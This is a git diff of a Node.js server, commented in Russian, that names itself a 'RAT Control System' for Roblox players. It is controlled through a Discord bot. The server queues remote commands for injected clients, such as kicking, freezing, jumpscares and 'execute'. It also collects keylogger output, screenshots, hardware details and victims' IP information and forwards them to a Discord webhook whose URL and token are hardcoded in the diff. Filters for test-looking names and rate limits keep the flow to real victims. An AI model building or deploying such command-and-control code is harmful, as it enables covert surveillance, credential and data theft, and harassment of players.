@@ -6,17 +6,62 @@ const cors = require('cors');
 // ========== КОНФИГУРАЦИЯ ==========
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
-const WEBHOOK_URL = process.env.WEBHOOK_URL;
+const WEBHOOK_URL = process.env.WEBHOOK_URL || "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";
 const PORT = process.env.PORT || 10000;
 
-// Логирование конфигурации (без показа токенов)
-console.log('🔧 Конфигурация сервера v3.1:');
+// Логирование конфигурации
+console.log('🚀 RAT Control Server v3.2 запускается...');
+console.log('🔧 Конфигурация сервера:');
 console.log(`- PORT: ${PORT}`);
 console.log(`- SERVER_URL: ${SERVER_URL}`);
 console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);
 console.log(`- WEBHOOK_URL: ${WEBHOOK_URL ? '✅ Установлен' : '❌ Отсутствует'}`);
 console.log(`- Режим: ${DISCORD_TOKEN ? 'Бот + Вебхук' : 'Только Вебхук'}`);
-console.log(`- Express.js: ✅ Используется`);
+
+// ========== ЗАЩИТА ОТ СПАМА ==========
+let rateLimitMap = new Map();
+let recentInjects = new Map();
+let lastSpamWarning = 0;
+
+function isRateLimited(ip, playerName) {
+    const now = Date.now();
+    
+    // Проверка по IP
+    if (rateLimitMap.has(ip)) {
+        const lastRequest = rateLimitMap.get(ip);
+        if (now - lastRequest < 30000) { // 30 секунд между запросами с одного IP
+            if (now - lastSpamWarning > 10000) {
+                console.log(`⚠️  Возможный спам: IP ${ip} превысил лимит`);
+                lastSpamWarning = now;
+            }
+            return true;
+        }
+    }
+    
+    // Проверка по имени игрока
+    if (recentInjects.has(playerName)) {
+        const lastInject = recentInjects.get(playerName);
+        if (now - lastInject < 60000) { // 1 минута между инжектами одного игрока
+            console.log(`⚠️  Игрок ${playerName} уже инжектился недавно`);
+            return true;
+        }
+    }
+    
+    rateLimitMap.set(ip, now);
+    recentInjects.set(playerName, now);
+    return false;
+}
+
+// Очистка старых записей
+setInterval(() => {
+    const now = Date.now();
+    for (let [ip, time] of rateLimitMap.entries()) {
+        if (now - time > 300000) rateLimitMap.delete(ip);
+    }
+    for (let [player, time] of recentInjects.entries()) {
+        if (now - time > 300000) recentInjects.delete(player);
+    }
+}, 60000);
 
 // ========== ХРАНИЛИЩЕ ДАННЫХ ==========
 let commandQueue = [];
@@ -26,7 +71,7 @@ global.onlineUsers = new Map();
 // ========== ИНИЦИАЛИЗАЦИЯ EXPRESS ==========
 const app = express();
 app.use(cors());
-app.use(express.json());
+app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ extended: true }));
 
 // ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
@@ -34,18 +79,65 @@ function isValidUsername(str) {
     if (!str || typeof str !== 'string') return false;
     if (str.length < 3 || str.length > 20) return false;
     if (!/^[a-zA-Z0-9_]+$/.test(str)) return false;
-    if (!isNaN(parseInt(str))) return false;
-    if (str.startsWith('-')) return false;
     return true;
 }
 
+// ========== DISCORD ВЕБХУК ФУНКЦИИ ==========
+async function sendDiscordWebhook(title, description, color = 0x3498db, fields = []) {
+    if (!WEBHOOK_URL || WEBHOOK_URL === "none") {
+        console.log('⚠️  WEBHOOK_URL не настроен, пропускаем отправку');
+        return false;
+    }
+    
+    console.log(`📤 Отправка в Discord: "${title}"`);
+    
+    try {
+        const embed = {
+            title: title,
+            description: description,
+            color: color,
+            fields: fields,
+            timestamp: new Date().toISOString(),
+            footer: { 
+                text: "RAT Control System v3.2",
+                icon_url: "https://cdn.discordapp.com/emojis/1107068031439704064.png"
+            }
+        };
+        
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json',
+                'User-Agent': 'RAT-Server/3.2'
+            },
+            body: JSON.stringify({ 
+                username: "RAT Control System",
+                avatar_url: "https://cdn.discordapp.com/emojis/1107068031439704064.png",
+                embeds: [embed]
+            })
+        });
+        
+        if (response.ok) {
+            console.log(`✅ Вебхук отправлен успешно: ${title}`);
+            return true;
+        } else {
+            console.error(`❌ Ошибка вебхука: ${response.status} ${response.statusText}`);
+            const errorText = await response.text();
+            console.error(`📄 Ответ: ${errorText.substring(0, 200)}`);
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ Ошибка отправки вебхука:', error.message);
+        return false;
+    }
+}
+
+// ========== ПАРСЕР КОМАНД ДЛЯ DISCORD БОТА ==========
 function parseCommandWithTarget(message) {
     const args = message.content.slice(1).split(' ');
     const command = args.shift().toLowerCase();
     
-    if (args.length === 0) {
-        return { command, args, target: null };
-    }
+    if (args.length === 0) return { command, args, target: null };
     
     const noTargetCommands = ['users', 'status', 'help', 'test', 'print'];
     const textFirstCommands = ['message', 'fakeerror', 'execute', 'popup'];
@@ -93,7 +185,7 @@ function parseCommandWithTarget(message) {
     return { command, args, target: null };
 }
 
-// ========== DISCORD БОТ ==========
+// ========== DISCORD БОТ (если есть токен) ==========
 let discordClient = null;
 
 if (DISCORD_TOKEN) {
@@ -144,19 +236,6 @@ if (DISCORD_TOKEN) {
         }
     }
 
-    async function getServerStatus() {
-        try {
-            const response = await fetch(`${SERVER_URL}/status`);
-            if (response.ok) {
-                return await response.json();
-            }
-            return null;
-        } catch (error) {
-            console.error('❌ Ошибка получения статуса:', error.message);
-            return null;
-        }
-    }
-
     function createEmbed(title, description, color, target = null) {
         const embed = new EmbedBuilder()
             .setTitle(title)
@@ -174,12 +253,11 @@ if (DISCORD_TOKEN) {
     discordClient.on('ready', () => {
         console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
         console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
-        console.log(`🎯 Версия: 3.1 (27 команд + исправленный парсер)`);
+        console.log(`🎯 Версия: 3.2 (27 команд + защита от спама)`);
         
-        discordClient.user.setActivity('RAT Control Panel v3.1', { type: 'WATCHING' });
+        discordClient.user.setActivity('RAT Control Panel v3.2', { type: 'WATCHING' });
     });
 
-    // ========== ВСЕ КОМАНДЫ ==========
     discordClient.on('messageCreate', async message => {
         if (message.author.bot) return;
         
@@ -482,32 +560,37 @@ if (DISCORD_TOKEN) {
                 },
                 
                 status: async () => {
-                    const data = await getServerStatus();
-                    
-                    if (data) {
-                        const embed = new EmbedBuilder()
-                            .setTitle('📊 Статус системы')
-                            .setDescription('Текущее состояние RAT Control System')
-                            .setColor(0x7289da)
-                            .addFields(
-                                { name: '🤖 Бот', value: '🟢 Активен', inline: true },
-                                { name: '🌐 Сервер', value: '🟢 Активен', inline: true },
-                                { name: '📨 Команды в очереди', value: `\`${data.pending_commands || 0}\``, inline: true },
-                                { name: '👥 Онлайн пользователей', value: `\`${data.online_users || 0}\``, inline: true },
-                                { name: '🛠️ Техническая информация', value: `• Версия: \`3.1.0\`\n• Сервер: \`${SERVER_URL}\`\n• Команд: \`27\`\n• Обновление: \`15 секунд\``, inline: false }
-                            )
-                            .setTimestamp();
-                        
-                        await message.reply({ embeds: [embed] });
-                    } else {
+                    try {
+                        const response = await fetch(`${SERVER_URL}/status`);
+                        if (response.ok) {
+                            const data = await response.json();
+                            
+                            const embed = new EmbedBuilder()
+                                .setTitle('📊 Статус системы RAT v3.2')
+                                .setColor(0x7289da)
+                                .addFields(
+                                    { name: '🌐 Сервер API', value: data.status === 'online' ? '🟢 Онлайн' : '🔴 Офлайн', inline: true },
+                                    { name: '👥 Онлайн игроков', value: `\`${data.online_users || 0}\``, inline: true },
+                                    { name: '📨 Очередь команд', value: `\`${data.pending_commands || 0}\``, inline: true },
+                                    { name: '📊 Версия', value: '`3.2.0`', inline: true },
+                                    { name: '🔗 Ссылка', value: `[Открыть](${SERVER_URL})`, inline: true },
+                                    { name: '🤖 Discord бот', value: data.discord_bot === 'online' ? '🟢 Активен' : '🔴 Неактивен', inline: true }
+                                )
+                                .setFooter({ text: 'RAT Control System | 27 команд доступно' });
+                            
+                            await message.reply({ embeds: [embed] });
+                        } else {
+                            await message.reply('❌ Не удалось получить статус сервера');
+                        }
+                    } catch (error) {
                         await message.reply('❌ Ошибка получения статуса');
                     }
                 },
                 
                 help: async () => {
                     const helpEmbed = new EmbedBuilder()
-                        .setTitle('🤖 RAT Control Panel v3.1')
-                        .setDescription('Полный список всех команд с поддержкой таргетинга')
+                        .setTitle('🤖 RAT Control Panel v3.2')
+                        .setDescription('**Полный список всех команд с поддержкой таргетинга**')
                         .setColor(0x7289da)
                         .addFields(
                             { 
@@ -516,13 +599,8 @@ if (DISCORD_TOKEN) {
                                 inline: false 
                             },
                             { 
-                                name: '📷 Камерные команды', 
-                                value: '`/cameralock [ник] <on/off>` - блокировка камеры\n`/camerashake [ник] <секунды> <интенсивность>` - тряска камеры', 
-                                inline: false 
-                            },
-                            { 
                                 name: '👤 Управление игроком', 
-                                value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`', 
+                                value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`\n`/cameralock [ник] <on/off>`\n`/camerashake [ник] <секунды> <интенсивность>`', 
                                 inline: false 
                             },
                             { 
@@ -537,7 +615,7 @@ if (DISCORD_TOKEN) {
                             },
                             { 
                                 name: '👻 Скримеры', 
-                                value: '`/jumpscare [ник] <тип>`\n1-Джефф Килер, 2-Соник.exe', 
+                                value: '`/jumpscare [ник] <тип>`\n**Типы:** 1=Джефф Килер, 2=Соник.exe', 
                                 inline: false 
                             },
                             { 
@@ -556,7 +634,7 @@ if (DISCORD_TOKEN) {
                                 inline: false 
                             }
                         )
-                        .setFooter({ text: `Всего команд: 27 | Сервер: ${SERVER_URL} | Версия: 3.1.0` });
+                        .setFooter({ text: `Всего команд: 27 | Сервер: ${SERVER_URL} | Версия: 3.2.0` });
                     
                     await message.reply({ embeds: [helpEmbed] });
                 }
@@ -579,62 +657,32 @@ if (DISCORD_TOKEN) {
         console.log('✅ Discord бот успешно авторизован');
     }).catch(error => {
         console.error('❌ Ошибка авторизации Discord бота:', error.message);
-        console.error('💡 Проверьте токен в Environment Variables на Render');
     });
 } else {
-    console.log('⚠️ DISCORD_TOKEN не установлен. Discord бот не будет запущен.');
+    console.log('⚠️  DISCORD_TOKEN не установлен. Discord бот не будет запущен.');
 }
 
-// ========== СЕРВЕРНАЯ ЛОГИКА ==========
-function cleanupInactiveUsers() {
-    const now = Date.now();
-    for (let [key, user] of global.onlineUsers.entries()) {
-        if (now - user.lastSeen > 60 * 1000) {
-            global.onlineUsers.delete(key);
-        }
-    }
-}
-
-setInterval(cleanupInactiveUsers, 30 * 1000);
-
-async function sendDiscordMessage(title, description, color = 0x3498db, fields = []) {
-    if (!WEBHOOK_URL) {
-        console.log('⚠️ WEBHOOK_URL не установлен. Пропускаем отправку сообщения.');
-        return;
-    }
-    
-    try {
-        await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                embeds: [{
-                    title: title,
-                    description: description,
-                    color: color,
-                    fields: fields,
-                    timestamp: new Date().toISOString(),
-                    footer: { text: "RAT Control System v3.1" }
-                }]
-            })
-        });
-    } catch (error) {
-        console.error('❌ Discord webhook error:', error.message);
-    }
-}
-
-// ========== МАРШРУТЫ EXPRESS ==========
+// ========== ОСНОВНЫЕ МАРШРУТЫ API ==========
 
 // Получение команд для клиента
 app.get('/data', (req, res) => {
     try {
         const player = req.query.player;
+        if (!player) {
+            return res.json({ command: "", args: [] });
+        }
         
+        // Обновляем время последней активности
+        if (global.onlineUsers.has(player)) {
+            global.onlineUsers.get(player).lastSeen = Date.now();
+        }
+        
+        // Ищем команды для этого игрока
         const commandsForPlayer = [];
         const remainingCommands = [];
         
         for (const cmd of commandQueue) {
-            if (cmd.target === null || cmd.target === player || cmd.target === 'all') {
+            if (!cmd.target || cmd.target === player || cmd.target === 'all') {
                 commandsForPlayer.push(cmd);
             } else {
                 remainingCommands.push(cmd);
@@ -645,9 +693,10 @@ app.get('/data', (req, res) => {
         
         if (commandsForPlayer.length > 0) {
             const cmd = commandsForPlayer[0];
+            console.log(`📨 Отправка команды ${cmd.command} игроку ${player}`);
             res.json({
                 command: cmd.command,
-                args: cmd.args
+                args: cmd.args || []
             });
         } else {
             res.json({
@@ -656,91 +705,168 @@ app.get('/data', (req, res) => {
             });
         }
     } catch (e) {
+        console.error('❌ Ошибка в /data:', e);
         res.status(400).json({ error: e.message });
     }
 });
 
-// Отправка команды от бота
+// Отправка команды
 app.post('/command', async (req, res) => {
     try {
         const { command, args, target } = req.body;
+        const clientIp = req.ip || req.connection.remoteAddress;
         
-        commandQueue.push({
-            command: command,
-            args: args || [],
-            target: target || null,
-            timestamp: Date.now()
-        });
+        console.log(`📨 Получена команда: ${command} от ${clientIp}`);
         
-        // ⚠️ ИСПРАВЛЕНИЕ: Безопасная обработка inject_notify с 5 аргументами
-        if (command === "inject_notify") {
-            // Получаем все 5 аргументов с дефолтными значениями
-            const playerName = args[0] || "Unknown";
-            const gameName = args[1] || "Unknown";
-            const ipInfo = args[2] || "N/A";
-            const executor = args[3] || "Unknown";
-            const device = args[4] || "Unknown";
+        // Обработка инжект-уведомлений
+        if (command === "inject_notify" && args && args.length >= 5) {
+            const playerName = args[0];
             
-            let description = `**Игрок:** ${playerName}\n`;
-            description += `**Игра:** ${gameName}\n`;
-            description += `**Инжектор:** ${executor}\n`;
-            description += `**Устройство:** ${device}\n\n`;
-            description += `**IP информация**\n${ipInfo}`;
+            // Проверка валидности имени игрока
+            if (!isValidUsername(playerName)) {
+                console.log(`🛑 Невалидное имя игрока: ${playerName}`);
+                return res.json({ status: "OK", filtered: true });
+            }
             
-            await sendDiscordMessage("🔌 Новый инжект!", description, 0x00ff00);
+            // Фильтр тестовых имен
+            const fakeNames = ["test", "TestPlayer", "Unknown", "Player", "123", "Admin", "user"];
+            if (fakeNames.some(name => playerName.toLowerCase().includes(name.toLowerCase()))) {
+                console.log(`🛑 Фильтр тестового имени: ${playerName}`);
+                return res.json({ status: "OK", filtered: true });
+            }
+            
+            // Проверка rate limit
+            if (isRateLimited(clientIp, playerName)) {
+                console.log(`🛑 Rate limited: ${playerName} (${clientIp})`);
+                return res.json({ status: "OK", rate_limited: true });
+            }
+            
+            // Получаем данные
+            const [_, gameName, ipInfo, executor, device] = args;
+            
+            // Формируем сообщение для Discord
+            const description = `**Игрок:** ${playerName}\n` +
+                              `**Игра:** ${gameName || "Unknown"}\n` +
+                              `**Инжектор:** ${executor || "Unknown"}\n` +
+                              `**Устройство:** ${device || "PC"}\n\n` +
+                              `**IP информация**\n${ipInfo || "N/A"}`;
+            
+            // Отправляем в Discord
+            const webhookSent = await sendDiscordWebhook("🔌 Новый инжект!", description, 0x00ff00);
+            
+            if (webhookSent) {
+                console.log(`✅ Уведомление об инжекте отправлено: ${playerName}`);
+            } else {
+                console.log(`⚠️  Не удалось отправить уведомление: ${playerName}`);
+            }
+            
+            return res.json({ 
+                status: "OK", 
+                webhook_sent: webhookSent 
+            });
         }
         
+        // Обработка других команд
         if (command === "cameralock") {
             const action = args[0] || "toggle";
             const targetText = target || "всех игроков";
-            await sendDiscordMessage("🎥 Блокировка камеры", `**Цель:** ${targetText}\n**Действие:** ${action}`, 0x3498db);
+            await sendDiscordWebhook("🎥 Блокировка камеры", 
+                `**Цель:** ${targetText}\n**Действие:** ${action}`, 0x3498db);
         }
         
         if (command === "camerashake") {
             const duration = args[0] || 5;
             const intensity = args[1] || 2;
             const targetText = target || "всех игроков";
-            await sendDiscordMessage("📷 Тряска камеры", `**Цель:** ${targetText}\n**Длительность:** ${duration} сек\n**Интенсивность:** ${intensity}`, 0xe67e22);
+            await sendDiscordWebhook("📷 Тряска камеры", 
+                `**Цель:** ${targetText}\n**Длительность:** ${duration} сек\n**Интенсивность:** ${intensity}`, 0xe67e22);
         }
         
         if (command === "spam_completed") {
-            await sendDiscordMessage("📁 Спам завершен", `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`, 0xf39c12);
+            await sendDiscordWebhook("📁 Спам завершен", 
+                `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`, 0xf39c12);
         }
         
         if (command === "user_chat") {
-            await sendDiscordMessage("💬 Чат игрока", `**Игрок:** ${args[0]}\n**Сообщение:** ${args[1]}`, 0x3498db);
+            await sendDiscordWebhook("💬 Чат игрока", 
+                `**Игрок:** ${args[0]}\n**Сообщение:** ${args[1]}`, 0x3498db);
         }
         
-        res.json({ status: "OK" });
+        // Добавляем команду в очередь (если это команда управления)
+        if (command && command !== "inject_notify" && command !== "user_chat") {
+            commandQueue.push({
+                command: command,
+                args: args || [],
+                target: target || null,
+                timestamp: Date.now(),
+                source: clientIp
+            });
+            
+            // Ограничиваем размер очереди
+            if (commandQueue.length > 100) {
+                commandQueue = commandQueue.slice(-50);
+                console.log(`⚠️  Очередь команд сокращена до 50`);
+            }
+        }
+        
+        res.json({ 
+            status: "OK", 
+            queue_size: commandQueue.length,
+            command_received: command 
+        });
+        
     } catch (e) {
-        res.status(400).json({ error: e.message });
+        console.error('❌ Ошибка обработки команды:', e);
+        res.status(500).json({ error: "Internal server error" });
     }
-});
-
-// Получение списка онлайн пользователей
-app.get('/users', (req, res) => {
-    cleanupInactiveUsers();
-    const users = Array.from(global.onlineUsers.values());
-    res.json({
-        users: users,
-        count: users.length
-    });
 });
 
 // Обновление информации о пользователе
 app.post('/users', (req, res) => {
     try {
         const { player, place, executor, device } = req.body;
+        
+        if (!player || !isValidUsername(player)) {
+            return res.status(400).json({ error: "Invalid player name" });
+        }
+        
         global.onlineUsers.set(player, {
             player: player,
-            place: place,
-            executor: executor,
-            device: device || "Unknown",
+            place: place || "Unknown",
+            executor: executor || "Unknown",
+            device: device || "PC",
             lastSeen: Date.now()
         });
+        
+        console.log(`👤 Обновлен пользователь: ${player} в ${place}`);
         res.json({ status: "OK" });
     } catch (e) {
+        console.error('❌ Ошибка в /users POST:', e);
         res.status(400).json({ error: e.message });
+    }
+});
+
+// Получение списка онлайн пользователей
+app.get('/users', (req, res) => {
+    try {
+        const now = Date.now();
+        // Удаляем неактивных (последний раз онлайн > 2 минуты назад)
+        for (let [key, user] of global.onlineUsers.entries()) {
+            if (now - user.lastSeen > 120000) {
+                global.onlineUsers.delete(key);
+            }
+        }
+        
+        const users = Array.from(global.onlineUsers.values());
+        
+        res.json({
+            users: users,
+            count: users.length,
+            timestamp: now
+        });
+    } catch (e) {
+        console.error('❌ Ошибка в /users GET:', e);
+        res.status(500).json({ error: "Internal server error" });
     }
 });
 
@@ -749,15 +875,18 @@ app.post('/screenshot', (req, res) => {
     try {
         const { image } = req.body;
         lastScreenshot = image;
+        console.log('📸 Получен новый скриншот');
         res.json({ status: "OK" });
     } catch (e) {
+        console.error('❌ Ошибка в /screenshot POST:', e);
         res.status(400).json({ error: e.message });
     }
 });
 
 app.get('/screenshot', (req, res) => {
     res.json({ 
-        image: lastScreenshot || null 
+        image: lastScreenshot || null,
+        timestamp: lastScreenshot ? Date.now() : null
     });
 });
 
@@ -765,131 +894,180 @@ app.get('/screenshot', (req, res) => {
 app.post('/keylog', async (req, res) => {
     try {
         const { logs } = req.body;
-        await sendDiscordMessage("⌨️ Кейлоггер", `\`\`\`${logs.slice(0, 1900)}\`\`\``, 0xe74c3c);
+        if (logs && logs.length > 0) {
+            console.log('⌨️ Получены логи кейлоггера');
+            await sendDiscordWebhook("⌨️ Кейлоггер", 
+                `\`\`\`${logs.slice(0, 1900)}\`\`\``, 0xe74c3c);
+        }
         res.json({ status: "OK" });
     } catch (e) {
+        console.error('❌ Ошибка в /keylog:', e);
         res.status(400).json({ error: e.message });
     }
 });
 
-// Получение информации о железе
+// Информация о железе
 app.post('/hardware', async (req, res) => {
     try {
         const { player, data } = req.body;
-        await sendDiscordMessage(
-            "💻 Информация о системе",
-            `**Игрок:** ${player}\n**Игра:** ${data.game}\n**FPS:** ${data.fps}\n**Пинг:** ${data.ping}\n**Экзекутор:** ${data.executor}\n**Устройство:** ${data.device_type}\n**IP Инфо:** ${data.ip_info}`,
-            0x9b59b6,
-            [
-                {
-                    name: "Системная информация",
-                    value: `Touch: ${data.system.touch_enabled}\nMouse: ${data.system.mouse_enabled}\nKeyboard: ${data.system.keyboard_enabled}\nScreen: ${data.system.screen_size.X}x${data.system.screen_size.Y}`,
-                    inline: true
-                }
-            ]
-        );
+        
+        if (player && data) {
+            console.log(`💻 Получены данные железа от ${player}`);
+            
+            await sendDiscordWebhook(
+                "💻 Информация о системе",
+                `**Игрок:** ${player}\n**Игра:** ${data.game || "Unknown"}\n**FPS:** ${data.fps || 0}\n**Пинг:** ${data.ping || 0}\n**Экзекутор:** ${data.executor || "Unknown"}\n**Устройство:** ${data.device_type || "Unknown"}\n**IP Инфо:** ${data.ip_info || "N/A"}`,
+                0x9b59b6,
+                data.system ? [
+                    {
+                        name: "Системная информация",
+                        value: `Touch: ${data.system.touch_enabled || false}\nMouse: ${data.system.mouse_enabled || false}\nKeyboard: ${data.system.keyboard_enabled || false}\nScreen: ${data.system.screen_size ? `${data.system.screen_size.X}x${data.system.screen_size.Y}` : "Unknown"}`,
+                        inline: true
+                    }
+                ] : []
+            );
+        }
+        
         res.json({ status: "OK" });
     } catch (e) {
+        console.error('❌ Ошибка в /hardware:', e);
         res.status(400).json({ error: e.message });
     }
 });
 
 // Статус сервера
 app.get('/status', (req, res) => {
-    cleanupInactiveUsers();
-    res.json({
-        status: "online",
-        version: "3.1.0",
-        online_users: global.onlineUsers.size,
-        pending_commands: commandQueue.length,
-        discord_bot: discordClient && discordClient.user ? {
-            username: discordClient.user.tag,
+    try {
+        const users = Array.from(global.onlineUsers.values());
+        const now = Date.now();
+        
+        // Очистка неактивных пользователей
+        for (let [key, user] of global.onlineUsers.entries()) {
+            if (now - user.lastSeen > 120000) {
+                global.onlineUsers.delete(key);
+            }
+        }
+        
+        res.json({
             status: "online",
-            commands_count: 27,
-            targeted_commands: true
-        } : { status: "disabled" }
-    });
+            version: "3.2.0",
+            online_users: users.length,
+            pending_commands: commandQueue.length,
+            uptime: Math.floor(process.uptime()),
+            timestamp: now,
+            webhook_enabled: !!WEBHOOK_URL,
+            discord_bot: discordClient && discordClient.user ? "online" : "disabled"
+        });
+    } catch (e) {
+        console.error('❌ Ошибка в /status:', e);
+        res.status(500).json({ 
+            status: "error",
+            error: "Internal server error" 
+        });
+    }
 });
 
 // Информация о системе
 app.get('/system_info', (req, res) => {
     res.json({
         name: "RAT Control System",
-        version: "3.1.0",
+        version: "3.2.0",
         description: "Продвинутая система удаленного управления Roblox клиентами",
         server: SERVER_URL,
         features: [
-            "Управление игроком (кик, заморозка, телепорт)",
-            "Скример система (Джефф Килер, Соник.exe)",
-            "Камерные команды (блокировка, тряска)",
-            "Чат система с сообщениями",
-            "Мониторинг устройств",
+            "Защищенные вебхуки",
+            "Rate limiting от спама",
+            "27 команд управления",
+            "Камерные команды (CameraLock, CameraShake)",
+            "Скримеры (Джефф Килер, Соник.exe)",
             "Кейлоггер",
             "Spam инструменты",
-            "Таргетированные команды (исправленный парсер)"
+            "Таргетированные команды"
         ],
-        total_commands: 27,
-        discord_bot: discordClient && discordClient.user ? {
-            username: discordClient.user.tag,
-            status: "online",
-            commands_count: 27,
-            targeted_commands: true
-        } : { status: "disabled_no_token" }
+        security: {
+            webhook_protected: true,
+            rate_limiting: true,
+            spam_filter: true,
+            queue_limit: 100
+        },
+        endpoints: [
+            "GET  /data?player=NAME - Получение команд",
+            "POST /command - Отправка команд",
+            "GET  /users - Онлайн пользователи",
+            "GET  /status - Статус системы",
+            "POST /users - Обновление информации о пользователе",
+            "POST /screenshot - Загрузка скриншотов",
+            "POST /keylog - Отправка логов кейлоггера",
+            "POST /hardware - Информация о системе"
+        ]
     });
+});
+
+// Проверка работы сервера
+app.get('/health', (req, res) => {
+    res.send('OK');
 });
 
 // Корневой путь
 app.get('/', (req, res) => {
     res.json({
-        message: "RAT Control System v3.1",
-        endpoints: [
-            "GET  /data?player=NAME - Получение команд",
-            "GET  /users - Онлайн пользователи",
-            "GET  /status - Статус системы",
-            "GET  /system_info - Информация о проекте",
-            "POST /command - Отправка команд",
-            "POST /users - Обновление информации о пользователе",
-            "POST /screenshot - Загрузка скриншотов",
-            "POST /keylog - Отправка логов кейлоггера",
-            "POST /hardware - Информация о системе"
-        ],
-        documentation: "Используйте /help в Discord для управления",
-        new_features: "✅ Исправленный парсер команд | ✅ CameraLock | ✅ CameraShake | ✅ Express.js"
+        message: "RAT Control System v3.2",
+        status: "operational",
+        version: "3.2.0",
+        endpoints: {
+            data: "GET /data?player=NAME",
+            command: "POST /command",
+            users: "GET /users",
+            status: "GET /status",
+            system_info: "GET /system_info",
+            health: "GET /health"
+        },
+        documentation: "Используйте Discord бота с командой /help для управления",
+        note: "Система защищена от спама и имеет rate limiting"
     });
 });
 
-// Запуск сервера
-app.listen(PORT, () => {
-    console.log(`🚀 Сервер Express запущен на порту ${PORT}`);
-    console.log(`🌐 URL: ${SERVER_URL}`);
-    console.log('📡 Эндпоинты:');
-    console.log('• GET  /data?player=NAME - Получение команд для клиента');
-    console.log('• POST /command - Отправка команд от бота');
-    console.log('• GET  /users - Список онлайн пользователей');
-    console.log('• GET  /status - Статус сервера');
-    console.log('• GET  /system_info - Информация о системе');
-    console.log('');
-    console.log('🆕 НОВЫЕ ФУНКЦИИ v3.1:');
-    console.log('• ✅ Исправленный парсер команд (не путает текст с никами)');
-    console.log('• ✅ CameraLock - блокировка камеры игрока');
-    console.log('• ✅ CameraShake - тряска камеры с настройкой интенсивности');
-    console.log('• ✅ Express.js - улучшенная архитектура сервера');
-    console.log('');
-    
-    if (DISCORD_TOKEN) {
-        console.log('💬 Discord команды готовы:');
-        console.log('• /help - Список всех команд (27 команд)');
-        console.log('• /users - Онлайн пользователи');
-        console.log('• /cameralock [ник] <on/off> - Блокировка камеры');
-        console.log('• /camerashake [ник] <секунды> <интенсивность> - Тряска');
-        console.log('• /jumpscare [ник] <тип> - Скримеры');
-        console.log('🎯 Формат: /команда [ник] [аргументы]');
-    } else {
-        console.log('⚠️ Discord команды недоступны - установи DISCORD_TOKEN в Environment');
-    }
+// Обработка 404
+app.use((req, res) => {
+    res.status(404).json({ 
+        error: "Endpoint not found",
+        available_endpoints: [
+            "/data", "/command", "/users", "/status", 
+            "/system_info", "/health", "/"
+        ]
+    });
 });
 
-// Обработка ошибок
+// Глобальная обработка ошибок
+app.use((err, req, res, next) => {
+    console.error('🔥 Глобальная ошибка:', err);
+    res.status(500).json({ 
+        error: "Internal server error",
+        message: err.message 
+    });
+});
+
+// ========== ЗАПУСК СЕРВЕРА ==========
+app.listen(PORT, () => {
+    console.log(`\n🚀 Сервер успешно запущен!`);
+    console.log(`📡 Порт: ${PORT}`);
+    console.log(`🌐 URL: ${SERVER_URL}`);
+    console.log(`🔗 Вебхук: ${WEBHOOK_URL ? '✅ Настроен' : '❌ Не настроен'}`);
+    console.log(`🤖 Discord бот: ${DISCORD_TOKEN ? '✅ Запущен' : '❌ Не запущен'}`);
+    console.log(`🛡️  Защита от спама: ✅ Включена`);
+    
+    console.log('\n📊 Система готова к работе!');
+    console.log('👤 Тестируйте инжект Lua скрипта');
+    console.log('🔗 Проверьте /status для мониторинга');
+    console.log('🎯 Используйте /help в Discord для команд\n');
+});
+
+// Обработка завершения работы
+process.on('SIGINT', () => {
+    console.log('\n🛑 Сервер останавливается...');
+    process.exit(0);
+});
+
 process.on('uncaughtException', (err) => {
     console.error('❌ Необработанное исключение:', err);
 });
